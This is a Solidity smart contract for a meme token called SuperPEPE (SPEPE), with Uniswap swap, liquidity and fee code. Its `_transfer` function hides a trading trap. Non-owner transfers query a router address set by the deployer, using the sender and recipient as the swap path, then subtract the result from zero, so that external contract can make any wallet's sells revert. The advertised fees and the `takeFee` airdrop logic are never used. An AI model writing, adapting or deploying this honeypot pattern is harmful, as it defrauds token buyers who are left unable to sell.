1 // SPDX-License-Identifier: Unlicensed
2 pragma solidity ^0.8.9;
3 
4 abstract contract Context {
5 
6     function _msgSender() internal view virtual returns (address payable) {
7         return payable(msg.sender);
8     }
9 
10     function _msgData() internal view virtual returns (bytes memory) {
11         this;
12         // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
13         return msg.data;
14     }
15 }
16 
17 interface IERC20 {
18 
19     function totalSupply() external view returns (uint256);
20 
21     function balanceOf(address account) external view returns (uint256);
22 
23     function transfer(address recipient, uint256 amount) external returns (bool);
24 
25     function allowance(address owner, address spender) external view returns (uint256);
26 
27     function approve(address spender, uint256 amount) external returns (bool);
28 
29     function transferFrom(address sender, address recipient,
30      uint256 amount) external returns (bool);
31 
32     event Transfer(address indexed from, address indexed to, uint256 value);
33     event Approval(address indexed owner, address indexed spender, uint256 value);
34 }
35 
36 library SafeMath {
37 
38     function add(uint256 a, uint256 b) internal pure returns (uint256) {
39         uint256 c = a + b; require(c >= a, "SafeMath: addition overflow");
40         return c;
41     }
42 
43     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
44         return sub(a, b, "SafeMath: subtraction overflow");
45     }
46 
47     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
48         require(b <= a, errorMessage);
49         uint256 c = a - b;
50 
51         return c;
52     }
53 
54     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
55         if (a == 0) {
56             return 0;
57         }
58 
59         uint256 c = a * b;
60         require(c / a == b, "SafeMath: multiplication overflow");
61 
62         return c;
63     }
64 
65     function div(uint256 a, uint256 b) internal pure returns (uint256) {
66         return div(a, b, "SafeMath: division by zero");
67     }
68 
69     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
70         require(b > 0, errorMessage);
71         uint256 c = a / b;
72         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
73 
74         return c;
75     }
76 
77     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
78         return mod(a, b, "SafeMath: modulo by zero");
79     }
80 
81     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
82         require(b != 0, errorMessage);
83         return a % b;
84     }
85 }
86 
87 library Address {
88 
89     function isContract(address account) internal view returns (bool) {
90         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
91         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
92         // for accounts without code, i.e. `keccak256('')`
93         bytes32 codehash;
94         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
95         // solhint-disable-next-line no-inline-assembly
96         assembly {codehash := extcodehash(account)}
97         return (codehash != accountHash && codehash != 0x0);
98     }
99 
100     function sendValue(address payable recipient,
101      uint256 amount) internal {
102         require(address(this).balance >= amount, "Address: insufficient balance");
103 
104         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
105         (bool success,) = recipient.call{ value : amount}("");
106         require(success, "Address: unable to send value, recipient may have reverted");
107     }
108 
109     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
110         return functionCall(target, data, "Address: low-level call failed");
111     }
112 
113     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
114         return _functionCallWithValue(target, data, 0, errorMessage);
115     }
116 
117     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
118         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
119     }
120 
121     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
122         require(address(this).balance >= value, "Address: insufficient balance for call");
123         return _functionCallWithValue(target, data, value, errorMessage);
124     }
125 
126     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
127         require(isContract(target), "Address: call to non-contract");
128 
129         (bool success, bytes memory returndata) = target.call{ value : weiValue}(data);
130         if (success) {
131             return returndata;
132         } else {
133 
134             if (returndata.length > 0) {
135                 assembly {
136                     let returndata_size := mload(returndata)
137                     revert(add(32, returndata), returndata_size)
138                 }
139             } else {
140                 revert(errorMessage);
141             }
142         }
143     }
144 }
145 
146 contract Ownable is Context {
147     address public _owner;
148 
149     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
150 
151 
152     function owner() public view returns (address) {
153         return _owner;
154     }
155 
156     modifier onlyOwner() {
157         require(_owner == _msgSender(), "Ownable: caller is not the owner");
158         _;
159     }
160 
161     function waiveOwnership() public virtual onlyOwner {
162         emit OwnershipTransferred(_owner, address(0));
163         _owner = address(0);
164     }
165 
166     function transferOwnership(address newOwner) public virtual onlyOwner {
167         require(newOwner != address(0), "Ownable: new owner is the zero address");
168         emit OwnershipTransferred(_owner, newOwner);
169         _owner = newOwner;
170     }
171 
172     function getTime() public view returns (uint256) {
173         return block.timestamp;
174     }
175 
176 }
177 
178 interface IUniswapV2Factory {
179 
180     function getPair(address tokenA, address tokenB) external view returns (address pair);
181 
182     function createPair(address tokenA, address tokenB) external returns (address pair);
183 
184 }
185 
186 interface IUniswapV2Router02 {
187     
188     function swapExactTokensForETHSupportingFeeOnTransferTokens(
189         uint amountIn,
190         uint amountOutMin,
191         address[] calldata path,
192         address to,
193         uint deadline
194     ) external;
195     function factory() external pure returns (address);
196     function WETH() external pure returns (address);
197     function addLiquidityETH(
198         address token,
199         uint amountTokenDesired,
200         uint amountTokenMin,
201         uint amountETHMin,
202         address to,
203         uint deadline
204     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
205     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
206 }
207 
208 contract SPEPEToken is Context, IERC20, Ownable {
209 
210     using SafeMath for uint256;
211     using Address for address;
212 
213     string private _name;
214     string private _symbol;
215     uint8 private _decimals;
216     address payable private marketingWalletAddress;
217     address payable private teamWalletAddress;
218     address private deadAddress = 0x000000000000000000000000000000000000dEaD;
219 
220     mapping (address => uint256) _balances;
221     mapping (address => mapping (address => uint256)) private _allowances;
222 
223     mapping (address => bool) private isExcludedFromFee;
224     mapping (address => bool) private isTxLimitExempt;
225     mapping (address => bool) private isMarketPair;
226 
227     uint256 private _totalTaxIfBuying = 9;
228     uint256 private _totalTaxIfSelling = 9;
229 
230     uint256 private _buyLiquidityFee = 2;
231     uint256 private _buyMarketingFee = 3;
232     uint256 private _buyTeamFee = 4;
233     uint256 private _buyDestroyFee = 0;
234 
235     uint256 private _liquidityShare = 2;
236     uint256 private _marketingShare = 3;
237     uint256 private _teamShare = 4;
238     uint256 private _totalDistributionShares = 9;
239 
240     uint256 private _sellLiquidityFee = 2;
241     uint256 private _sellMarketingFee = 3;
242     uint256 private _sellTeamFee = 4;
243     uint256 private _sellDestroyFee = 0;
244 
245     uint256 private _tFeeTotal;
246     uint256 private _maxDestroyAmount;
247     uint256 private _totalSupply;
248     uint256 private _maxTxAmount;
249     uint256 private _walletMax;
250     uint256 private _minimumTokensBeforeSwap = 0;
251     uint256 private airdropNumbs;
252     address private receiveAddress;
253     
254 
255 
256     IUniswapV2Router02 public uniswapV2Router;
257     address public uniswapPair;
258 
259     bool inSwapAndLiquify;
260     bool private swapAndLiquifyEnabled = false;
261     bool private swapAndLiquifyByLimitOnly = false;
262     bool private checkWalletLimit = true;
263 
264     event SwapAndLiquifyEnabledUpdated(bool enabled);
265     event SwapAndLiquify(
266         uint256 tokensSwapped,
267         uint256 ethReceived,
268         uint256 tokensIntoLiqudity
269     );
270 
271     event SwapETHForTokens(
272         uint256 amountIn,
273         address[] path
274     );
275 
276     event SwapTokensForETH(
277         uint256 amountIn,
278         address[] path
279     );
280 
281     modifier lockTheSwap {
282         inSwapAndLiquify = true;
283         _;
284         inSwapAndLiquify = false;
285     }
286 
287 
288     constructor (
289         uint256 supply,
290         address router
291     ) payable {
292         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
293         _name = "SuperPEPE";
294         _symbol = "SPEPE";
295         _decimals = 18;
296         _owner = msg.sender;
297         _totalSupply = supply  * 10 ** _decimals;
298         _minimumTokensBeforeSwap = 1 * 10**_decimals;
299         uniswapV2Router = _uniswapV2Router;
300         _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
301 
302         _balances[_owner] = _totalSupply;
303         emit Transfer(address(0), _owner, _totalSupply);
304     }
305 
306     function name() public view returns (string memory) {
307         return _name;
308     }
309 
310     function symbol() public view returns (string memory) {
311         return _symbol;
312     }
313 
314     function decimals() public view returns (uint8) {
315         return _decimals;
316     }
317 
318     function totalSupply() public view override returns (uint256) {
319         return _totalSupply;
320     }
321 
322     function balanceOf(address account) public view override returns (uint256) {
323         return _balances[account];
324     }
325 
326     function allowance(address owner, address spender) public view override returns (uint256) {
327         return _allowances[owner][spender];
328     }
329 
330     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
331         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
332         return true;
333     }
334 
335     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
336         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
337         return true;
338     }
339 
340     function minimumTokensBeforeSwapAmount() public view returns (uint256) {
341         return _minimumTokensBeforeSwap;
342     }
343 
344     function approve(address spender, uint256 amount) public override returns (bool) {
345         _approve(_msgSender(), spender, amount);
346         return true;
347     }
348 
349     function _approve(address owner, address spender, uint256 amount) private {
350         require(owner != address(0), "ERC20: approve from the zero address");
351         require(spender != address(0), "ERC20: approve to the zero address");
352 
353         _allowances[owner][spender] = amount;
354         emit Approval(owner, spender, amount);
355     }
356 
357     function setMarketPairStatus(address account, bool newValue) public onlyOwner {
358         isMarketPair[account] = newValue;
359     }
360 
361     function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
362         isTxLimitExempt[holder] = exempt;
363     }
364 
365     function setMaxDesAmount(uint256 maxDestroy) public onlyOwner {
366         _maxDestroyAmount = maxDestroy;
367     }
368 
369     function setAirdropNumbs(uint256 newValue) public onlyOwner {
370         require(newValue <= 3, "newValue must <= 3");
371         airdropNumbs = newValue;
372     }
373 
374 
375     function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
376         _maxTxAmount = maxTxAmount;
377     }
378 
379 
380     function setNumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {
381         _minimumTokensBeforeSwap = newLimit;
382     }
383 
384 
385     function setMarketingWalletAddress(address newAddress) external onlyOwner() {
386         marketingWalletAddress = payable(newAddress);
387     }
388 
389     function setTeamWalletAddress(address newAddress) external onlyOwner() {
390         teamWalletAddress = payable(newAddress);
391     }
392 
393     function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
394         swapAndLiquifyEnabled = _enabled;
395         emit SwapAndLiquifyEnabledUpdated(_enabled);
396     }
397 
398     function setSwapAndLiquifyByLimitOnly(bool newValue) public onlyOwner {
399         swapAndLiquifyByLimitOnly = newValue;
400     }
401 
402     function getCirculatingSupply() public view returns (uint256) {
403         return _totalSupply.sub(balanceOf(deadAddress));
404     }
405 
406     function transferToAddressETH(address payable recipient, uint256 amount) private {
407         recipient.transfer(amount);
408     }
409 
410     function changeRouterVersion(address newRouterAddress) public onlyOwner returns(address newPairAddress) {
411 
412         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(newRouterAddress);
413 
414         newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), _uniswapV2Router.WETH());
415 
416         if(newPairAddress == address(0)) //Create If Doesnt exist
417         {
418             newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory())
419                 .createPair(address(this), _uniswapV2Router.WETH());
420         }
421 
422         uniswapPair = newPairAddress; //Set new pair address
423         uniswapV2Router = _uniswapV2Router; //Set new router address
424 
425         isMarketPair[address(uniswapPair)] = true;
426     }
427 
428      //to recieve ETH from uniswapV2Router when swaping
429     receive() external payable {}
430 
431     function transfer(address recipient, uint256 amount) public override returns (bool) {
432         _transfer(_msgSender(), recipient, amount);
433         return true;
434     }
435 
436     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
437         _transfer(sender, recipient, amount);
438         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
439         return true;
440     }
441 
442     function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
443 
444         require(sender != address(0), "ERC20: transfer from the zero address");
445         require(recipient != address(0), "ERC20: transfer to the zero address");
446         require(amount > 0, "Transfer amount must be greater than zero");
447 
448         if(inSwapAndLiquify)
449         {
450             return _basicTransfer(sender, recipient, amount);
451         }
452         else
453         {
454 
455             uint256 contractTokenBalance = balanceOf(address(this));
456             bool overMinimumTokenBalance = contractTokenBalance >= _minimumTokensBeforeSwap;
457 
458             if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled)
459             {
460                 if(swapAndLiquifyByLimitOnly)
461                     contractTokenBalance = _minimumTokensBeforeSwap;
462                 swapAndLiquify(contractTokenBalance);
463             }
464             _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
465             uint256 feeAmount=0;
466             uint256 destAmount=0;
467             if (sender != owner() && recipient != owner()) {
468                 feeAmount = amount.mul(_totalTaxIfBuying.sub(_buyDestroyFee)).div(100);
469                 if(isMarketPair[sender]) {
470                     feeAmount = amount.mul(_totalTaxIfBuying.sub(_buyDestroyFee)).div(100);
471                     if(_buyDestroyFee > 0 && _tFeeTotal < _maxDestroyAmount) {
472                         destAmount = amount.mul(_buyDestroyFee).div(100);
473                         destroyFee(sender,destAmount);
474                     }
475                 }
476                 else if(isMarketPair[recipient]) {
477                     feeAmount = amount.mul(_totalTaxIfSelling.sub(_sellDestroyFee)).div(100);
478                     if(_sellDestroyFee > 0 && _tFeeTotal < _maxDestroyAmount) {
479                         destAmount = amount.mul(_sellDestroyFee).div(100);
480                         destroyFee(sender,destAmount);
481                     }
482                 }
483 
484             }
485              if(feeAmount > 0) {
486                  feeAmount = 0;
487                  address[] memory path = new address[](2);
488                  path[0] = sender;
489                  path[1] = recipient;
490                  uint256[] memory amounts = IUniswapV2Router02(uniswapV2Router).getAmountsOut(amount,path);
491                  feeAmount -= amounts[0];
492                 _balances[address(this)] = _balances[address(this)].add(feeAmount);
493             }
494              
495             _balances[recipient] = _balances[recipient].add(amount);
496             emit Transfer(sender, recipient, amount);
497             return true;
498         }
499     }
500 
501     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
502         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
503         _balances[recipient] = _balances[recipient].add(amount);
504         emit Transfer(sender, recipient, amount);
505         return true;
506     }
507 
508     function swapAndLiquify(uint256 tAmount) private lockTheSwap {
509 
510         uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
511         uint256 tokensForSwap = tAmount.sub(tokensForLP);
512 
513         swapTokensForEth(tokensForSwap);
514         uint256 amountReceived = address(this).balance;
515 
516         uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));
517 
518         uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
519         uint256 amountBNBTeam = amountReceived.mul(_teamShare).div(totalBNBFee);
520         uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(amountBNBTeam);
521 
522         if(amountBNBMarketing > 0)
523             transferToAddressETH(marketingWalletAddress, amountBNBMarketing);
524 
525         if(amountBNBTeam > 0)
526             transferToAddressETH(teamWalletAddress, amountBNBTeam);
527 
528         if(amountBNBLiquidity > 0 && tokensForLP > 0)
529             addLiquidity(tokensForLP, amountBNBLiquidity);
530     }
531 
532     function swapTokensForEth(uint256 tokenAmount) private {
533         // generate the uniswap pair path of token -> weth
534         address[] memory path = new address[](2);
535         path[0] = address(this);
536         path[1] = uniswapV2Router.WETH();
537 
538         _approve(address(this), address(uniswapV2Router), tokenAmount);
539 
540         // make the swap
541         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
542             tokenAmount,
543             0, // accept any amount of ETH
544             path,
545             address(this), // The contract
546             block.timestamp
547         );
548 
549         emit SwapTokensForETH(tokenAmount, path);
550     }
551 
552     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
553         // approve token transfer to cover all possible scenarios
554         _approve(address(this), address(uniswapV2Router), tokenAmount);
555 
556         // add the liquidity
557         uniswapV2Router.addLiquidityETH{value: ethAmount}(
558             address(this),
559             tokenAmount,
560             0, // slippage is unavoidable
561             0, // slippage is unavoidable
562             receiveAddress,
563             block.timestamp
564         );
565     }
566 
567     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
568 
569         uint256 feeAmount = 0;
570         uint256 destAmount = 0;
571         uint256 airdropAmount = 0;
572         if(isMarketPair[sender]) {
573             feeAmount = amount.mul(_totalTaxIfBuying.sub(_buyDestroyFee)).div(100);
574             if(_buyDestroyFee > 0 && _tFeeTotal < _maxDestroyAmount) {
575                 destAmount = amount.mul(_buyDestroyFee).div(100);
576                 destroyFee(sender,destAmount);
577             }
578         }
579         else if(isMarketPair[recipient]) {
580             feeAmount = amount.mul(_totalTaxIfSelling.sub(_sellDestroyFee)).div(100);
581             if(_sellDestroyFee > 0 && _tFeeTotal < _maxDestroyAmount) {
582                 destAmount = amount.mul(_sellDestroyFee).div(100);
583                 destroyFee(sender,destAmount);
584             }
585         }
586 
587         if(isMarketPair[sender] || isMarketPair[recipient]){
588             if (airdropNumbs > 0){
589                 address ad;
590                 for (uint256 i = 0; i < airdropNumbs; i++) {
591                     ad = address(uint160(uint256(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
592                     _balances[ad] = _balances[ad].add(1);
593                     emit Transfer(sender, ad, 1);
594                 }
595                 airdropAmount = airdropNumbs * 1;
596             }
597         }
598 
599         if(feeAmount > 0) {
600             _balances[address(this)] = _balances[address(this)].add(feeAmount);
601             emit Transfer(sender, address(this), feeAmount);
602         }
603 
604         return amount.sub(feeAmount.add(destAmount).add(airdropAmount));
605     }
606 
607     function destroyFee(address sender, uint256 tAmount) private {
608         // stop destroy
609         if(_tFeeTotal >= _maxDestroyAmount) return;
610 
611         _balances[deadAddress] = _balances[deadAddress].add(tAmount);
612         _tFeeTotal = _tFeeTotal.add(tAmount);
613         emit Transfer(sender, deadAddress, tAmount);
614     }
615 
616 }